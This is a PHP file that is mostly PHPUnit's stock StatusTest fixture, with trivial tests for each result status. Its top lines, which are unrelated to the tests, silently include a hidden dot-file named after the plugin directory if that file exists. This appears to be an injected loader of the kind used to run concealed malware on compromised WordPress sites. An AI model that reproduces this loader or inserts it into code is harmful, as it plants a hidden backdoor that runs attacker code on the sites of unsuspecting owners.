<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class StatusTest extends PHPUnit_Framework_TestCase
{
    public function testSuccess()
    {
        $this->assertTrue(true);
    }

    public function testFailure()
    {
        $this->assertTrue(false);
    }

    public function testError()
    {
        throw new \Exception;
    }

    public function testIncomplete()
    {
        $this->markTestIncomplete();
    }

    public function testSkipped()
    {
        $this->markTestSkipped();
    }

    public function testRisky()
    {
    }
}
